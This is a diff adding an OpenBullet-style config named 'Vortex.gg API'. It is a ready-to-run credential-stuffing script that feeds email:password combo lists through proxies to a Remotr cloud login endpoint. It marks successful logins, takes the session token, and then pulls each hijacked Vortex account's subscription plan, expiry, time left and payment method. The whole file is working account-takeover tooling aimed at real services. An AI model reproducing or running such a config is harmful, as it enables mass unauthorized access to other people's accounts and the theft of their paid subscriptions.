@@ -1,0 +1,94 @@
+[SETTINGS]
+{
+  "Name": "Vortex.gg API",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2021-02-22T12:53:46.1734204-08:00",
+  "AdditionalInfo": "Ricking#3224",
+  "Author": "Ricking#3224",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#LOGIN REQUEST POST "https://api-v2.remotrcloud.com/login" 
+  CONTENT "{\"email\":\"<USER>\",\"name\":\"samsung SM-G925F\",\"pass\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: RemotrAndroid/1.0.237" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Content-Length: 75" 
+  HEADER "Host: api-v2.remotrcloud.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "status\":\"success\"" 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" DoesNotContain "status\":\"success\"" 
+
+PARSE "<SOURCE>" LR "{\"token\":\"" "\"" -> VAR "token"  
+
+REQUEST GET "https://vortex-api.gg/users/<token>/account" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#sub PARSE "<SOURCE>" LR "\"is_subscribed\":" ",\"user" -> VAR "sub" 
+
+#PLAN PARSE "<SOURCE>" LR "\"subscription_info\":" ",\"" CreateEmpty=FALSE -> CAP "PLAN" 
+
+#EX PARSE "<SOURCE>" LR "\"expire_date\":\"" "\",\"" CreateEmpty=FALSE -> CAP "EXPIRY" 
+
+#TIME___ PARSE "<SOURCE>" LR "\"time_left\":" ",\"" CreateEmpty=FALSE -> CAP "TIME LEFT" "" "mins" 
+
+#PAYMENT PARSE "<SOURCE>" LR "\"subscribed_via\":" ",\"" CreateEmpty=FALSE -> CAP "PAYMENT METHOD" 
+
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<sub>" Contains "false" 
+
+
+
